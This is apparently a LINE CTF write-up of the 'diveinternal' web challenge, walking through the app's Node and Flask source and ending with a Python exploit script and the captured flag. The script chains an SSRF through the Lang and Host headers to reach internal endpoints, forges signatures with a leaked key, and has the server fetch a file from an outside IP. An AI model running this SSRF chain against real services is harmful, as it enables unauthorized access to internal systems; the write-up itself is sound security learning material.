![](https://github.com/wjddnjs33/image/blob/main/images/linectf.png?raw=true)

I solved one challenge for web

---
## <span style="color:#21C587"></span> (Web) diveinternal [50 pts]

> The diveinternal challenge is to get a flag using an ssrf vulenrability.

```javascript
var express = require('express');
var request = require('request');
var querystring = require('querystring');

var router = express.Router();

if (process.env.NODE_ENV == 'local') { //set the environment value before your running this app
  require('dotenv').config();
}


var target = process.env.TARGET_HOST;
var test = process.env.TEST;



/* GET home page. */
router.get('/', function(req, res, next) {
  request({
    headers: req.headers,
    uri: `http://${target}/`,
  }, function(err, data){
    res.render('index', { title: 'apis' , data: data.body});
  });
  
});


router.get('/coin', function(req, res, next) {
  request({
        headers: req.headers,
        uri: `http://${target}/coin`,
      }).pipe(res);
  });

  router.get('/addsub', function(req, res, next) {
    request({
          
          uri: `http://${target}/addsub`,
          qs: {
            email: req.query.email,
          }
        }).pipe(res);
    });
  
module.exports = router;
```
Above code is code of `api`, I can see that send a request using a `${target}`.

```
TEST=test
TARGET_HOST=localhost:5050
```
Also, I can know that send a request to internal server because `TARGET_HOST` is localhost

```
FROM node:lts-alpine as base

ADD ./src /src
WORKDIR /src
COPY /src/package*.json /
EXPOSE 3000

FROM base as production
ENV NODE_ENV=production
ENV TARGET_HOST=private:5000
RUN npm install -g nodemon && npm install
RUN npm ci
COPY . /
CMD ["node", "bin/www"]

FROM base as dev
ENV NODE_ENV=development
ENV DEBUG=frontend:*
ENV TARGET_HOST=private:5000
RUN npm install -g nodemon && npm install
COPY . /
CMD ["nodemon", "bin/www"]

FROM base as local
ENV NODE_ENV=development
ENV DEBUG=frontend:*
ENV TARGET_HOST=localhost:5050
RUN npm install -g nodemon && npm install
COPY . /
CMD ["nodemon", "bin/www"]
```
When I check a docker file, I can know to was open a 5050/5000 port. Viz, I can able use a `localhost:5050`, `localhost:5000`.

```python
def RunRollbackDB(dbhash):
    try:
        if os.environ['ENV'] == 'LOCAL':
            return
        if dbhash is None:
            return "dbhash is None"
        dbhash = ''.join(e for e in dbhash if e.isalnum())
        if os.path.isfile('backup/'+dbhash):
            with open('FLAG', 'r') as f:
                flag = f.read()
                return flag
        else:
            return "Where is file?"
```
And first, when I see an important flag reading condition, If environment of server is not `Local` and exist a file called `'backup/' + dbhash`, retrun a flag.

```python
@app.route('/coin', methods=['GET'])
def coin():
    try:
        response = app.response_class()
        language = LanguageNomarize(request)
        response.headers["Lang"] =  language
        data = getCoinInfo()
        response.data = json.dumps(data)
        return response
    except Exception as e :
        err = 'Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno)
        logger.error(err)
```
First, I can see that when `api` server send a request to `/coin` , put a result value of `LanguageNomarize()` function to header called `Lang` and to reponse after bring an information of coin using a `getCoinInfo()` function.

```python
def LanguageNomarize(request):
    if request.headers.get('Lang') is None:
        return "en"
    else:
        regex = '^[!@#$\\/.].*/.*' # Easy~~
        language = request.headers.get('Lang')
        language = re.sub(r'%00|%0d|%0a|[!@#$^]|\.\./', '', language)
        if re.search(regex,language):
            return request.headers.get('Lang')
        
        try:
            data = requests.get(request.host_url+language, headers=request.headers)
            if data.status_code == 200:
                return data.text
            else:
                return request.headers.get('Lang')
        except:
            return request.headers.get('Lang')
```
When I see a `LanguateNomarize()` function, If to exist a header called `Lang`, confirm a value of header using regular expression, and I can see to send a request using a `request.get()` function. In here, Occur an `ssrf` vulnerability because I can send a request of where I want after modifying a `request.host_url` and `language`.

```python
@app.route('/integrityStatus', methods=['GET'])
def integritycheck():
    data = {'db':'database/master.db','dbhash':activity.dbHash}
    data = json.dumps(data)
    return data
```
Second, I'll check the `/integrityStatus`. We usually can't send a request because `/integrityStatus` not communicating to `api` server. But I can find a value of `dbhash` by making a request to `/integrityStatus` using an `ssrf` vulnerability.

```python
@app.route('/rollback', methods=['GET'])
def rollback():
    try:
        if request.headers.get('Sign') == None:
            return json.dumps(status['sign'])
        else:
            if SignCheck(request):
                pass
            else:
                return json.dumps(status['sign'])

        if request.headers.get('Key') == None:
            return json.dumps(status['key'])
        result  = activity.IntegrityCheck(request.headers.get('Key'),request.args.get('dbhash'))
        return result
    except Exception as e :
        err = 'Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno)
        logger.error(err)
        return json.dumps(status['error']), 404
```
Third, I can see that when I see a `/rollback`, If value of `SignCheck()` is true and exist a value of header called `Key`, call an `IntegrityCheck()` method.

```python
    def IntegrityCheck(self,key, dbHash): 

        if self.integrityKey == key:
            pass
        else:
            return json.dumps(status['key'])
        if self.dbHash != dbHash:
            flag = RunRollbackDB(dbHash)
            logger.debug('DB File changed!!'+dbHash)
            file = open(os.environ['DBFILE'],'rb').read()
            self.dbHash = hashlib.md5(file).hexdigest()
            self.integrityKey = hashlib.sha512((self.dbHash).encode('ascii')).hexdigest()
            return flag
        return "DB is safe!"
```
When I see the `IntegrityCheck()` method, the value of `self.integrityKey` and the value of `Key` are the same, and if the value of `self.dbHash` and `dbHash` are not the same, I can see that the `RunRollbackDB()` function is executed.

```python
def RunRollbackDB(dbhash):
    try:
        if os.environ['ENV'] == 'LOCAL':
            return
        if dbhash is None:
            return "dbhash is None"
        dbhash = ''.join(e for e in dbhash if e.isalnum())
        if os.path.isfile('backup/'+dbhash):
            with open('FLAG', 'r') as f:
                flag = f.read()
                return flag
        else:
            return "Where is file?"
                
    except Exception as e :
        logger.error('Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno))
        return "exception!!"
        pass
```
`RunRollbackDB()` is a function that reads and returns a `FLAG` file if the `backup/dbhash` file exists, as seen above.

So I thought with the following scenario at first

- Scenario 1
1. Using `ssrf` vulnerability to send a request to `/integrityStatus` to get the value of dbHash.
2. Read the FLAG by sending a request to `/rollback` using the retrieved value of `dbHash`.
3. FLAG is returned as a header value of lang.

However, an exploit was attempted using the above scenario, but the attack could not be performed because the value of self.dbHash and `dbHash` in the `IntegrityCheck()` function had to be different.

```python
def WriteFile(url):
    local_filename = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open('backup/'+local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                f.write(chunk)
```
So, when I analyzed the code again, I could see that the `WriteFile()` function was used to create a file under `backup/`. So, if you create any file using `WriteFile` function and send the name of the file to `dbHash`, it is not the same as the value of `self.dbHash`, which is a variable in the class, and it is Because it exists, it is enough to bypass it and read the flags.

When I see inside the `WriteFile()` function, a request is sent using the `requests.get()` function, and the value of `url.split('/')[-1]` is used as the file name to create it.

```python
@app.route('/download', methods=['GET','POST'])
def download():
    try:
        if request.headers.get('Sign') == None:
            return json.dumps(status['sign'])
        else:
            if SignCheck(request):
                pass
            else:
                return json.dumps(status['sign'])

        if request.method == 'GET':
            src = request.args.get('src')

            if valid_download(src):
                pass
            else:
                return json.dumps(status.get('false'))
                
        elif request.method == 'POST':
            if valid_download(request.form['src']):
                pass
            else:
                return json.dumps(status.get('false'))

        WriteFile(src)
        return json.dumps(status.get('success'))
```
The `WriteFile()` function is called from `/download`. At this time, if the header value `Sign` exists, the return value of the `SignCheck()` function is true, and the `src` parameter value exists, `WriteFile()` function is executed.

- Scenario 2
1. Using the `ssrf` vulnerability, a request was sent to `/download` to create a random file.
2. Again, using the `ssrf` vulnerability, sending a request to `/rollback` to read the FLAG
3. In this case, the `self.dbHash != dbHash` syntax is bypassed by using the file name.
4. Finally, just read the `Lang` header.

- A note of caution
1. When creating a file, a request is sent using the `requests.get()` function, so when creating a file, a `URL` must be sent to create it.
2. The value of `dbHash` is parsed once more within the `RunRollbackDB()` function, and the value of `e.isalnum()` must be true.
3. When reading the flag, the value of the environment variable `ENV` should not be `local`, so port `5000` should be used instead of port `5050`.

```python
import hmac
import hashlib
import requests

url = 'http://35.200.63.50/apis/'

Key = hashlib.sha512(('ed05a1c7ff6428dcf8d50901b6e78ba3').encode('ascii')).hexdigest()
print('[+] Key  : ' + Key)

def sign(KEY):
    privateKey = b'let\'sbitcorinparty'
    EN = hmac.new( privateKey , KEY.encode('utf-8'), hashlib.sha512 )
    return EN.hexdigest()

def integrityStatus():
    headers = {'Host':'localhost:5000', 'Lang':'/integrityStatus'}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/integreityStatus : ' + res.headers['lang'])

def download():
    headers = {'Host':'localhost:5000', 'Lang':'download?src=http://141.164.52.207/a123', 'Sign':sign('src=http://141.164.52.207/a123')}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/download : ' + res.headers['lang'])

def rollback():
    headers = {'Host':'localhost:5000', 'Lang':'/rollback?dbhash=a123', 'Sign':sign('dbhash=a123'), 'Key':Key}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/rollback : ' + res.headers['lang'])

if __name__ == '__main__':
    integrityStatus()
    download()
    rollback()
```

```txt
LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}
```

---
